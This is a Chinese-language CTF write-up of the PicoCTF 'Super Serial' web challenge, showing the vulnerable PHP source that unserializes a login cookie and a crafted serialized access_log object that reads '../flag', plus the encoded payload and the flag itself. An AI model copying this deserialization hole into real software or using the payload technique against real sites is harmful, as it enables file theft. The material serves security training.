---
title: PicoCTF - Super Serial
tags: [PicoCTF, CTF, Web]

category: "Security Practice｜PicoCTF｜Web"
date: 2023-06-20
---

# PicoCTF - Super Serial
<!-- more -->
###### tags: `PicoCTF` `CTF` `Web`

## Background
[php unserialization](https://hackmd.io/@SBK6401/B1I5n1pns)

## Hint
* The flag is at ../flag

## Recon
這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化
1. robot.txt
一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是`sqli`，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且`/admin.phps`沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析
![](https://hackmd.io/_uploads/BkcThh0Pn.png)

2. index.phps
用index.phps查看source code發現有一些其他怪東西，包括`authentication.phps`和`cookie.php`
    :::spoiler Real Source Code
    ```php=
    <?php
    require_once("cookie.php");

    if(isset($_POST["user"]) && isset($_POST["pass"])){
        $con = new SQLite3("../users.db");
        $username = $_POST["user"];
        $password = $_POST["pass"];
        $perm_res = new permissions($username, $password);
        if ($perm_res->is_guest() || $perm_res->is_admin()) {
            setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
            header("Location: authentication.php");
            die();
        } else {
            $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
        }
    }
    ?>

    <!DOCTYPE html>
    <html>
    <head>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link href="style.css" rel="stylesheet">
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    </head>
        <body>
            <div class="container">
                <div class="row">
                    <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                        <div class="card card-signin my-5">
                            <div class="card-body">
                                <h5 class="card-title text-center">Sign In</h5>
                                <?php if (isset($msg)) echo $msg; ?>
                                <form class="form-signin" action="index.php" method="post">
                                    <div class="form-label-group">
                                        <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
                                        <label for="user">Username</label>
                                    </div>

                                    <div class="form-label-group">
                                        <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
                                        <label for="pass">Password</label>
                                    </div>

                                    <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </body>
    </html>

    ```
    :::

3. authentication.phps
    :::spoiler Real Source Code
    ```php=
    <?php

    class access_log
    {
        public $log_file;

        function __construct($lf) {
            $this->log_file = $lf;
        }

        function __toString() {
            return $this->read_log();
        }

        function append_to_log($data) {
            file_put_contents($this->log_file, $data, FILE_APPEND);
        }

        function read_log() {
            return file_get_contents($this->log_file);
        }
    }

    require_once("cookie.php");
    if(isset($perm) && $perm->is_admin()){
        $msg = "Welcome admin";
        $log = new access_log("access.log");
        $log->append_to_log("Logged in at ".date("Y-m-d")."\n");
    } else {
        $msg = "Welcome guest";
    }
    ?>

    <!DOCTYPE html>
    <html>
    <head>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link href="style.css" rel="stylesheet">
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    </head>
        <body>
            <div class="container">
                <div class="row">
                    <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                        <div class="card card-signin my-5">
                            <div class="card-body">
                                <h5 class="card-title text-center"><?php echo $msg; ?></h5>
                                <form action="index.php" method="get">
                                    <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </body>
    </html>

    ```
    :::

4. cookie.phps
    :::spoiler Real Source Code
    ```php=
    <?php
    session_start();

    class permissions
    {
        public $username;
        public $password;

        function __construct($u, $p) {
            $this->username = $u;
            $this->password = $p;
        }

        function __toString() {
            return $u.$p;
        }

        function is_guest() {
            $guest = false;

            $con = new SQLite3("../users.db");
            $username = $this->username;
            $password = $this->password;
            $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
            $stm->bindValue(1, $username, SQLITE3_TEXT);
            $stm->bindValue(2, $password, SQLITE3_TEXT);
            $res = $stm->execute();
            $rest = $res->fetchArray();
            if($rest["username"]) {
                if ($rest["admin"] != 1) {
                    $guest = true;
                }
            }
            return $guest;
        }

            function is_admin() {
                    $admin = false;

                    $con = new SQLite3("../users.db");
                    $username = $this->username;
                    $password = $this->password;
                    $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                    $stm->bindValue(1, $username, SQLITE3_TEXT);
                    $stm->bindValue(2, $password, SQLITE3_TEXT);
                    $res = $stm->execute();
                    $rest = $res->fetchArray();
                    if($rest["username"]) {
                            if ($rest["admin"] == 1) {
                                    $admin = true;
                            }
                    }
                    return $admin;
            }
    }

    if(isset($_COOKIE["login"])){
        try{
            $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
            $g = $perm->is_guest();
            $a = $perm->is_admin();
        }
        catch(Error $e){
            die("Deserialization error. ".$perm);
        }
    }

    ?>
    ```
    :::
這一題的直覺是用不安全的反序列化達到LFI或是RCE，問題是要利用哪一個class，可以看到這幾個file中只有`authentication.phps`中的`access_log`和`cookie.phps`中的`permission`，而考慮到hint提到flag的相對位置，代表應該可以確定是LFI的思路，則我們可以找有讀取file的class也就是`access_log`，另外`authentication.phps`也能單獨access，剩下的事情就簡單了，就construct一個exploit payload然後按照decode的順序反著做一次就可以了

Note: 我再講詳細一點好了，不管是`index.phps`或是`authentication.phps`都會在一開始require `cookie.php`，代表他會執行以下這段程式，並且進行反序列化，而會用到LFI的class method是在`authentication.phps`中，所以我們要訪問的網頁應該是這個，然後要創建login cookie是因為`cookie.phps`需要這個東西才會進入判斷式
```php
if(isset($_COOKIE["login"])){
    try{
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm->is_guest();
        $a = $perm->is_admin();
    }
    catch(Error $e){
        die("Deserialization error. ".$perm);
    }
}
```

## Exploit - Unserialization
1. php -a
    ```php
    $ php -a
    Interactive mode enabled

    php > class access_log
    php > {
    php {     public $log_file;
    php {
    php {     function __construct($lf) {
    php {         $this->log_file = $lf;
    php {     }
    php {
    php {     function __toString() {
    php {         return $this->read_log();
    php {     }
    php {
    php {     function append_to_log($data) {
    php {         file_put_contents($this->log_file, $data, FILE_APPEND);
    php {     }
    php {
    php {     function read_log() {
    php {         return file_get_contents($this->log_file);
    php {     }
    php { }
    php > echo urlencode(base64_encode(serialize(new access_log("../flag"))));
    TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
    ```
2. 建一個cookie然後access authentication.phps
![](https://hackmd.io/_uploads/ByM5qVkdh.png)

Flag: `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}`


## Reference
[ picoCTF 2021 Super Serial ](https://youtu.be/Eu3nFVAwAK0)